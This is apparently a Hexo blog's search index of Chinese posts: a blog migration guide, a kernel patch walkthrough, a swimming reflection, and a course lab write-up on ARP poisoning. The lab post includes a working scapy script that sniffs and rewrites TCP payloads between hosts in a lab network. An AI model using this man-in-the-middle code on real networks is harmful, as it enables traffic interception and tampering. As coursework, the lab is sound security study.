<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一次博客移植</title>
      <link href="/2024/03/01/%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E7%A7%BB%E6%A4%8D/"/>
      <url>/2024/03/01/%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E7%A7%BB%E6%A4%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="一切的一切"><a href="#一切的一切" class="headerlink" title="一切的一切"></a>一切的一切</h1><p>关于我为什么长时间没更新了这个问题，在23年的12月和1月，我的电脑经历了开机蓝屏的事故，在尝试了几十种方法无果后，我放弃了。但是，却听从了售后的建议重置了系统，这直接导致我的blog仓库和github连接切断。我预先保存好了blog的一切文件，在搜寻了一些网上教程后，重新密钥连接了github仓库和我的本地机后台，索性直接写一篇来讲一下我是怎么做的，以及遇到的问题。o(＝•𖥦＜=)o★～<br><img src="/images/image.png"></p><h1 id="不断尝试"><a href="#不断尝试" class="headerlink" title="不断尝试"></a>不断尝试</h1><h2 id="寻找MyBlog"><a href="#寻找MyBlog" class="headerlink" title="寻找MyBlog"></a>寻找MyBlog</h2><p>最开始，我从OneDrive中保存到桌面，但是文件数量过多导致下载统计极度缓慢。我的解决方案是，利用everything文件资源管理器，快速查找我的四个盘中的文件然后快速复制到桌面上。</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>对于以前的环境，现在都需要重新配置，主要包括hexo的下载和nmp的安装（因为hexo需要npm才能装）</p><h3 id="git准备"><a href="#git准备" class="headerlink" title="git准备"></a>git准备</h3><p>对于git的安装，可以直接去官网，或者利用腾讯管家的软件市场一步到位完成，只需注意环境变量的配置，然后能正常使用git bash即可。注意，一定要配置好环境变量，否则后面使用hexo会报错。</p><blockquote><p><a href="https://git-scm.com/downloads">git 下载链接</a><br>配置上，主要包括两个信息。</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name "你的名字"（注意前边是“- -global”，有两个横线）</span><br><span class="line">git config --global user.email "你的邮箱"</span><br></pre></td></tr></tbody></table></figure><p>然后，去配置ssh：<br>首先，检查是否存在.ssh文件夹，如果有，选cd，没有则mkdir</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh/</span><br><span class="line">// mkdir ~/.ssh （无.ssh）</span><br><span class="line">ssh-kengen -t rsa -C "youremail"</span><br></pre></td></tr></tbody></table></figure><p>不需要设置密码的话，一路回车就行。<br>然后在.ssh/ 目录下将id_rsa.pub的内容复制到github，具体位置在设置-SSH keys中，新建一个密钥把内容粘贴进去。</p><h3 id="npm安装"><a href="#npm安装" class="headerlink" title="npm安装"></a>npm安装</h3><p>网上有npm（实际上是nodejs）的详细教程，对于不学vue的小白来说，不需要全部照做，我在此只把hexo移植需要的步骤写下来，具体流程放在下面，需要者自取。</p><blockquote><p><a href="https://blog.csdn.net/panpan_Yang/article/details/130284726">npm安装-详细教程</a></p></blockquote><h4 id="npm是什么"><a href="#npm是什么" class="headerlink" title="npm是什么"></a>npm是什么</h4><p>npm 是 NodeJS 下的包管理器，vue-cli脚手架模板就是基于 node 下的 npm 来完成安装的。<br>相关介绍~<br>webpack: 它的主要用途是通过CommonJS的语法把所有浏览器端需要发布的静态资源做相应的准备，比如资源的合并和打包。<br>vue-cli：官方提供的一个脚手架，用于快速生成一个 vue 的项目模板。</p><h4 id="安装，配置环境变量"><a href="#安装，配置环境变量" class="headerlink" title="安装，配置环境变量"></a>安装，配置环境变量</h4><p>windows下的NodeJS安装是比较方便的（v0.6.0版本之后，支持windows native），只需要直接访问官网，这里我们可以选择 Windows 安装包 (.msi)-64位 进行安装。</p><blockquote><p><a href="https://nodejs.cn/download/">npm下载官网</a><br>安装过程一路next即可，会默认添加到环境变量里。<br>对于安装的确认，win+R输入cmd打开命令行，输入node -v检查，有版本号即可。<br>可以选择给你的npm换成淘宝源，下载东西更快。</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org/</span><br></pre></td></tr></tbody></table></figure><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><p>首先打开git bash，执行下面的语句安装hexo。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></tbody></table></figure><p>用hexo -v检查是否安装成功。<br>当时，我遇到了一个报错：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br><span class="line">npm WARN tarball tarball data for gifsicle@https://registry.npmmirror.com/gifsicle/-/gifsicle-5.3.0.tgz (sha512-9ewIQQCAnSmkU2DhuWafd1DdsgzAkKqIWnY+023xBLSiK9Az2TDUozWQW+SyRQgFMclbe6RQldUk/49TRO3Aqw==) seems to be corrupted. Trying again.</span><br><span class="line">npm ERR! code EINTEGRITY</span><br><span class="line">npm ERR! sha512-9ewIQQCAnSmkU2DhuWafd1DdsgzAkKqIWnY+023xBLSiK9Az2TDUozWQW+SyRQgFMclbe6RQldUk/49TRO3Aqw== integrity checksum failed when using sha512: wanted sha512-9ewIQQCAnSmkU2DhuWafd1DdsgzAkKqIWnY+023xBLSiK9Az2TDUozWQW+SyRQgFMclbe6RQldUk/49TRO3Aqw== but got sha512-FJTpgdj1Ow/FITB7SVza5HlzXa+/lqEY0tHQazAJbuAdvyJtkH4wIdsR2K414oaTwRXHFLLF+tYbipj+OpYg+Q==. (578258 bytes)</span><br><span class="line"></span><br><span class="line">npm ERR! A complete log of this run can be found in: C:\Users\31435\AppData\Local\npm-cache\_logs\2024-02-29T14_53_32_988Z-debug-0.log</span><br></pre></td></tr></tbody></table></figure><p>这个错误表明在下载 gifsicle 软件包时出现了问题，导致校验和不匹配。这可能是由于网络问题或者 npm 源的问题引起的。<br>我找到了一些网上的解决方案：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 1.清除npm缓存并重试</span><br><span class="line">npm cache clean --force</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line">// 2.更改 npm 源：尝试切换到其他 npm 源，例如官方源。</span><br><span class="line">npm config set registry https://registry.npmjs.org/</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line">// 3.手动安装 gifsicle：直接下载 gifsicle 的压缩包并手动安装。</span><br><span class="line">npm install gifsicle@latest --save</span><br><span class="line"></span><br><span class="line">//如果以上方法都无法解决问题，建议等待一段时间后再尝试安装，可能是 npm 源的临时问题。</span><br></pre></td></tr></tbody></table></figure><p>𖦹ࡇ𖦹.ᐟ.ᐟ<br>当然，这些对我都没起作用，我直接用了以前下载的nodejs，在系统盘彻底重置后，缺少了很多依赖dll，在重装并设置新源后解决了。</p><h2 id="最终"><a href="#最终" class="headerlink" title="最终"></a>最终</h2><h3 id="本地try"><a href="#本地try" class="headerlink" title="本地try"></a>本地try</h3><p>把你之前的库文件夹复制到你的工作文件夹下，然后进入库根目录，右键打开git bash<br>直接尝试</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo c &amp;&amp; hexo d &amp;&amp; hexo s</span><br></pre></td></tr></tbody></table></figure><p>然后去浏览器local：指定端口查看。</p><h3 id="除此之外"><a href="#除此之外" class="headerlink" title="除此之外"></a>除此之外</h3><p>以上方案是针对你的库没有丢失任何文件的，如果你选择保留node_modules以外的文件，就要在最终步前，根目录下执行</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></tbody></table></figure><p>当然，你也可以选择只保留</p><ul><li>_config.yml</li><li>package.json</li><li>scaffolds/</li><li>source/</li><li>themes/<br>然后，由一句话变成四句<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-generator-feed --save</span><br><span class="line">npm install hexo-generator-sitemap --save</span><br></pre></td></tr></tbody></table></figure></li></ul><p>好了，到这一步，我们的blog就彻底完成移植工作了，如果执行hexo d的时候报权限禁止了，就检查下你的密钥复制对了没，git配置对了没。<br>新学期了，祝大家能够活出自我，一直向前，朝着理想中的自己不断前进。♡&gt;𖥦&lt;)!!</p>]]></content>
      
      
      <categories>
          
          <category> way of life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>520和安全一同度过</title>
      <link href="/2024/03/01/520%E6%99%9A%E4%B8%8A%E7%9A%84%E6%94%BB%E9%98%B2%E6%B5%AA%E6%BC%AB/"/>
      <url>/2024/03/01/520%E6%99%9A%E4%B8%8A%E7%9A%84%E6%94%BB%E9%98%B2%E6%B5%AA%E6%BC%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="那个晚上"><a href="#那个晚上" class="headerlink" title="那个晚上"></a>那个晚上</h1><p>谁家好人在520全天满课啊，没错就是我了。520的晚上我正式开始了安全综合实践课程，由于实验内容很有趣因此在这里分享一下具体过程。然后，祝大家都过了一个难忘的520.</p><h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><p>内网攻防，arp中毒和netcat传输tcp数据包篡改。</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Ubuntu Seed，网段192.168.60.0/24<br>设备：攻击机HostM：192.168.60.3 eth0，被攻击机HostA：192.168.60.2，eth0，网关HostB：192.168.60.1，docker2。</p><h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>M进行arp中毒和中间人流量转发，A nc连接网关 B，M开启ip转发判断是否实现中间人，然后关闭ip转发，保持中毒状态，运行TCP数据包嗅探篡改和转发脚本，实现将A发往B的数据由123篡改为456。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="arp毒化和中间人伪造"><a href="#arp毒化和中间人伪造" class="headerlink" title="arp毒化和中间人伪造"></a>arp毒化和中间人伪造</h3><p><img src="/images/poi1.png"><br><img src="/images/poi2.png"><br><img src="/images/poi3.png"></p><h3 id="监听脚本-listen-py"><a href="#监听脚本-listen-py" class="headerlink" title="监听脚本 listen.py"></a>监听脚本 listen.py</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">MAC_A = "02:42:c0:a8:3c:02"</span><br><span class="line">MAC_B = "02:42:c9:92:f0:d5"</span><br><span class="line"></span><br><span class="line">def spoof_pkt(pkt):</span><br><span class="line">    a = IP(src=pkt[IP].src, dst=pkt[IP].dst)</span><br><span class="line">    b = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack)</span><br><span class="line"></span><br><span class="line">    data = bytes(pkt[TCP].payload)  # 将payload转换为字节串</span><br><span class="line">    print("**** %s, length: %d" % (data, len(data)))</span><br><span class="line">    newdata = data.replace(b'123', b'456')  # 使用字节串替换</span><br><span class="line">    newpkt = a/b/newdata</span><br><span class="line"></span><br><span class="line">    send(newpkt)</span><br><span class="line"></span><br><span class="line">f = 'tcp and (ether src ' + MAC_A + ' or ether src ' + MAC_B + ' )'</span><br><span class="line">pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)</span><br></pre></td></tr></tbody></table></figure><h3 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h3><p><img src="/images/520result.png"></p><h3 id="其它有关代码"><a href="#其它有关代码" class="headerlink" title="其它有关代码"></a>其它有关代码</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nc -ln 9090</span><br><span class="line">nc &lt;ip&gt; &lt;port&gt;</span><br><span class="line"></span><br><span class="line">docker run &lt;name&gt;</span><br><span class="line">docker start &lt;name&gt;</span><br><span class="line">docker exec -it &lt;name&gt; /bin/bash</span><br><span class="line">docker ps -a</span><br><span class="line">docker cp  &lt;name&gt;:/../..  test.txt</span><br><span class="line">docker cp test.txt &lt;name&gt;:/../..</span><br><span class="line">arp -a</span><br><span class="line">arp -d &lt;ip&gt;</span><br><span class="line">arp -n</span><br><span class="line"></span><br><span class="line">sudo -i</span><br><span class="line">Iptables -P FORWARD ACCEPT</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> way of life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一次Linux Kernel的patch提交</title>
      <link href="/2023/10/23/%E7%AC%AC%E4%B8%80%E6%AC%A1Linux-Kernel%E7%9A%84patch%E6%8F%90%E4%BA%A4/"/>
      <url>/2023/10/23/%E7%AC%AC%E4%B8%80%E6%AC%A1Linux-Kernel%E7%9A%84patch%E6%8F%90%E4%BA%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="记录第一次对Linux-Kernel所做的贡献"><a href="#记录第一次对Linux-Kernel所做的贡献" class="headerlink" title="记录第一次对Linux Kernel所做的贡献"></a>记录第一次对Linux Kernel所做的贡献</h1><p>Linux 内核是 Linux 计算机操作系统的核心。内核是计算机硬件与其进程之间的核心接口，确保有可用的内存供 Linux 应用程序运行、优化处理器以及在应用程序间导航系统要求。Linux 内核通过“中断”在硬件和应用程序之间进行通信（摘录自bing）。</p><p><del>通过提交自己的patch可以让代码进入到kernel中，永世保存</del>x<br>修改不良的代码风格和解决相关安全隐患√</p><h2 id="什么是Linux-Kernel的patch？"><a href="#什么是Linux-Kernel的patch？" class="headerlink" title="什么是Linux Kernel的patch？"></a>什么是Linux Kernel的patch？</h2><p>Linux patch 命令 Linux patch 命令用于修补文件。 patch 指令让用户利用设置修补文件的方式，修改，更新原始文件。 倘若一次仅修改一个文件，可直接在指令列中下达指令依序执行。 如果配合修补文件的方式则能一次修补大批文件，这也是 Linux 系统核心的升级方法之一。</p><p>Linux内核作为世界最大的开源软件之一，其开发和维护工作非常重要，需要无数开发者共同努力。<br>向Linux社区贡献代码的最基本方式是邮件向maintainer提交补丁，而不是通过github中的fork和pull request。</p><p>提交patch和submit message需要遵循相关规范，具体可参考相关文档。</p><blockquote><p><a href="https://www.cnblogs.com/pengdonglin137/p/3341159.html">PATCH 格式</a><br><a href="https://www.cnblogs.com/qianxiaox/p/14110940.html">commit message格式</a></p></blockquote><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>本文基于Windows介绍自己提交的全过程以及遇到的问题，不过这边建议直接用linux或者GBN相关的系统，会少走一些弯路，看到后面就明白了。我因为懒得经常开虚拟机和没有liveUSB去装载外置系统所以还是用的windows。</p><ul><li>版本控制git （一般自带git diff）</li><li>标准bash（一般自带git send-email没有则自己装）</li><li>perl （在bash中一般自带，用perl -v查看）</li></ul><p>git send-email 为发送补丁的第三方客户端，diff比较文件差异，perl用于执行后面提到的patch检查脚本。</p><p>此外，git send-email需要提前配置。<br>就我而言，需要使用校园邮箱，配置示例如下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[sendemail]</span><br><span class="line">        smtpEncryption = ssl</span><br><span class="line">        smtpServer = mail.hust.edu.cn</span><br><span class="line">        smtpUser = &lt;你的邮箱地址&gt;</span><br><span class="line">        smtpServerPort = 465</span><br><span class="line">        smptAuth = LOGIN</span><br></pre></td></tr></tbody></table></figure><h2 id="进行修改"><a href="#进行修改" class="headerlink" title="进行修改"></a>进行修改</h2><p>首先，通过git clone拷贝官网仓库</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/</span><br></pre></td></tr></tbody></table></figure><p>在进行下一步时，出现了报错<strong>Clone succeeded, but checkout failed. drivers/gpu/drm/nouveau/nvkm/subdev/i2c/aux.c</strong>去stackoverflow查找原因，给我的回答是因为windows的NTFS保护机制造成的报错，解决方案</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config core.protectNTFS false</span><br><span class="line">git reset --hard HEAD</span><br></pre></td></tr></tbody></table></figure><p>解决后我们拿到了kernel源码，准备进行修改，修改前，学校的静态扫描工具已经提前告知我错误位置</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ERROR: space required after that ',' (ctx:VxV)</span><br><span class="line">#119: FILE: ../linux-next/drivers/media/usb/dvb-usb/dibusb-mc-common.c:119:</span><br><span class="line">+       u8 a,b;</span><br><span class="line">            ^</span><br><span class="line">ERROR: space required after that ',' (ctx:VxV)</span><br><span class="line">#127: FILE: ../linux-next/drivers/media/usb/dvb-usb/dibusb-mc-common.c:127:</span><br><span class="line">+               dibusb_read_eeprom_byte(adap-&gt;dev,0x7E,&amp;a);</span><br><span class="line">                                                 ^</span><br></pre></td></tr></tbody></table></figure><p>这边建议新建一个自己工作的分支，不要影响主分支。<br>后面就是找到文件，根据报错添加空格。</p><h2 id="commit-and-make-patch"><a href="#commit-and-make-patch" class="headerlink" title="commit and make patch"></a>commit and make patch</h2><p>进行commit时，需要描述进行的改动，标题格式参考其他patch，作为新手，我直接使用了下面这条指令</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -asev</span><br></pre></td></tr></tbody></table></figure><p>参数s表示自动添加Signed-off-by： balabala，同时参数e会启动打开vim编辑器。commit message可参考如下示例。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">media: dvb: add space after comma to fix coding style</span><br><span class="line"></span><br><span class="line">checkpacth complains that:</span><br><span class="line"></span><br><span class="line">ERROR: space required after that ',' (ctx:VxV)</span><br><span class="line">#119: FILE: ../linux-next/drivers/media/usb/dvb-usb/dibusb-mc-common.c:119:</span><br><span class="line">+       u8 a,b;</span><br><span class="line">            ^</span><br><span class="line">ERROR: space required after that ',' (ctx:VxV)</span><br><span class="line">#127: FILE: ../linux-next/drivers/media/usb/dvb-usb/dibusb-mc-common.c:127:</span><br><span class="line">+               dibusb_read_eeprom_byte(adap-&gt;dev,0x7E,&amp;a);</span><br><span class="line">                                                 ^</span><br><span class="line">Fix it by adding required spaces after the commas to fix the coding</span><br><span class="line">style issue.</span><br><span class="line"></span><br><span class="line">Signed-off-by: Yalong Zou &lt;yalongz@hust.edu.cn&gt;</span><br></pre></td></tr></tbody></table></figure><p>下面直接利用刚才的commit生成patch</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git format-patch -1</span><br></pre></td></tr></tbody></table></figure><p>上述命令直接在当前目录生成了一份包含标准邮件格式的.patch文件，-1表示进包含一个commit。<br>Subject：至Signed-off-by行之间，需要对补丁详细描述，如何发现问题，错误原因，修改方式等。</p><p>最后回到仓库根目录，运行检查脚本，确保没有其他错误。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在内核代码仓库目录下</span><br><span class="line">./scripts/checkpatch.pl &lt;生成的 patch 的文件名&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="发送邮件，等待回复"><a href="#发送邮件，等待回复" class="headerlink" title="发送邮件，等待回复"></a>发送邮件，等待回复</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git send-email --to=收件人邮箱 --cc=抄送的对象 &lt;生成的 patch 的文件名&gt;</span><br></pre></td></tr></tbody></table></figure><p>发送过程中需要完成密码验证，只需更改邮箱设置独立密码即可用于验证。</p><p>在这之前，最后现发给别人看看，不要因为低级错误浪费审核人的时间。比如将收件人邮箱替换为自己的QQ邮箱。<br>发送之后，只需耐心等待，内核维护者们都很勤奋，但不一定及时。加入长时间没人回复可以ping或者resend。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git format-patch -1 --subject-prefix='PING'</span><br><span class="line"># or</span><br><span class="line">git format-patch -1 --subject-prefix='RESEND'</span><br></pre></td></tr></tbody></table></figure><h2 id="修改v2，v3……"><a href="#修改v2，v3……" class="headerlink" title="修改v2，v3……"></a>修改v2，v3……</h2><p>当Re： PATCH到达邮箱大门时，也许只是一句普通的问候，也是是一长串的问题指出。<br>对于新的PATCH v2，应在最初的分支上改动，而不是在Commit基础上提交新的代码。</p><p>按意见更改后，就可以发出PATCH v2了，然后记得在Reviewed by后加上Changelog信息，即进行的修改。如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1 -&gt; v2: Directed deleted 'base' and its related code based on PATCH v1</span><br></pre></td></tr></tbody></table></figure><p>新的邮件主题也要改</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git format-patch -1 --subject-prefix='PATCH v2'</span><br></pre></td></tr></tbody></table></figure><p>之后一样的发送。</p><h2 id="接受后"><a href="#接受后" class="headerlink" title="接受后"></a>接受后</h2><p>当补丁被maintainer接受后，先被合并到该模块的子树，然后和其他补丁一起交给Linux，最后进入内核主线。自此，完成了对kernel的一次贡献。</p><h2 id="其他注意事项"><a href="#其他注意事项" class="headerlink" title="其他注意事项"></a>其他注意事项</h2><ul><li>第二次commit时可以更改一些指令，我还没有具体尝试，等以后会补充更新。</li><li>好懒，以后要勤奋更blog了QAQ，明天是1024程序节，提前祝世界各地的开发者们节日快乐，也祝自己别再掉发了（哭）。</li></ul>]]></content>
      
      
      <categories>
          
          <category> way of life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>游泳感悟</title>
      <link href="/2023/07/14/%E6%B8%B8%E6%B3%B3%E6%84%9F%E6%82%9F/"/>
      <url>/2023/07/14/%E6%B8%B8%E6%B3%B3%E6%84%9F%E6%82%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="从游泳中能学到什么"><a href="#从游泳中能学到什么" class="headerlink" title="从游泳中能学到什么"></a>从游泳中能学到什么</h1><hr><h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>距离前文所说的下一篇发布时间还不到一周，哈哈，主要是今天突然有了想法，于是就打算写一篇抒发一下想法。说实在的，游泳和计算机技术好像是牛马不搭边的事情。但是近期的经历实则让我学到了宝贵的思维，并且将以往所学应用到了别的领域当中，我认为这是计算机人不可或缺的一种能力。还有就是最近在看一本书《娱乐至死》于是想通过文字隐喻锻炼自己的语言能力，让自己摆脱浮躁无话可说的处境，所以还是在此记录下来，而不是发朋友圈了。<br><img src="https://i01piccdn.sogoucdn.com/eab3ec6b853ced4c" alt="soft"></p><h2 id="相关背景"><a href="#相关背景" class="headerlink" title="相关背景"></a>相关背景</h2><p>时间：七月八号还是九号开始，到今天十四号，每天用时半个小时到一个半小时，成绩：从0到1，完全不会到可以游个七八米。<br>ok那么开始介绍一些有关背景故事吧。首先是我的大学足球课程老师（不方便透露别的信息），他教给了我两点最宝贵的东西，这是我在游泳中所主要运用的：1大脑是最宝贵的财富，把所学运用到运动中，多思考。2不要心浮气躁，要勇敢试错，敢于尝试，但是要建立在对的方法和方向上。然后是我的导师，他主要讲了两点：1思维能力很重要，体现在看问题的广度和深度，对一样东西建立模型然后进行研究得到新发现。2平时的课程可能没用，但是在下结论之前不妨认真听一下，因为其中的思维或许会在不就的将来带来作用（支持）。<br><img src="https://i02piccdn.sogoucdn.com/13c607f2bf4eb027"></p><h2 id="实际运用"><a href="#实际运用" class="headerlink" title="实际运用"></a>实际运用</h2><p>现在开始讲讲我在这五六天中是怎么做的，当旁人只会说一句话：呛几口水就行了的时候我是怎么考虑问题的。<br>首先，对一个完全不熟悉的事物，先进行体验和摸索，具备一定的感觉，在这个阶段我花了相当的时间。戴着救生圈，但不只是胡乱划水，而是不断摸索姿势，运用一点物理知识，思考怎么让自己获得更多反作用力，怎么时刻保持平衡，怎么加快自己的前进速度……这一阶段持续到12号结束，从13号开始我取下救生圈开始试着游几下。不出所料，听到的还是那句话，呛几口水就好了。诚然，我有点胆小不敢呛水，这是一点阻碍进步的地方，辩证的分析一下，适当呛水还是很有帮助的。因此，我采用了另外一个不呛水的方案，我认为，只要方法合适， <em>前期</em>     ，一样能平稳学会游泳。考虑到最近在学车，我适当的融入了一点驾考的元素进去。考虑到之前划水积累的经验，我将学习分成了不同的多个项目，例如：戴小救生圈漂浮，戴小救生圈前进，自由漂浮，自由前进，姿势切换等等。考虑的实际应用，根据从简到难，从单一到组合的原则，先掌握单个简单项目，再训练组合项目例如姿势切换，最后在一定路径内实战，合适的使用出单一项目和组合项目即可。对于自由漂浮还可以细分：手部姿势单独训练，腿部姿势单独训练，手部腿部同时训练等等。在脑海中构建一个所谓的游泳技术栈，不需要他人过多指导，广度思考根据经验明白需要什么。再去深度思考，把可能出现的意外情况和解决方案考虑到，基础练好了再去执行。<br><img src="https://i02piccdn.sogoucdn.com/701670534506b6cf"><br>由于后面三天有事，暂时停止训练，不过之后该做什么，该怎么做我已经有了初步的规划，相信再练个几天就能基本基本所需能力了（小期待，因为以后可以去学校游泳馆游个痛快）。</p><h2 id="启发收获"><a href="#启发收获" class="headerlink" title="启发收获"></a>启发收获</h2><p>谈不上什么特别大的启发，主要收获就是自己能够将听到的一些好的建议和自己所学运用到生活中了，不再是之前听人枯燥的劝诫，有一种庖丁暂时附身的自在和闲适。<br>然后惊喜的发现游泳既可以治疗颈椎又可以瘦腿，程序猿很难不i，夏天太热了不想跑步正好可以去游泳。<br><img src="https://i04piccdn.sogoucdn.com/471e1cd897ff4c60"></p><h2 id="不足分析"><a href="#不足分析" class="headerlink" title="不足分析"></a>不足分析</h2><p>主要不足之处就是胆子比较小，方法要对这个点没问题，但是不能把勇气给束缚住了对吧。</p><blockquote><p>期待成长，遇见成长，拥抱成长，生活很美，只是需要我们投入进去感受。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> way of life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> enlightenment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>启程</title>
      <link href="/2023/07/11/%E5%90%AF%E7%A8%8B/"/>
      <url>/2023/07/11/%E5%90%AF%E7%A8%8B/</url>
      
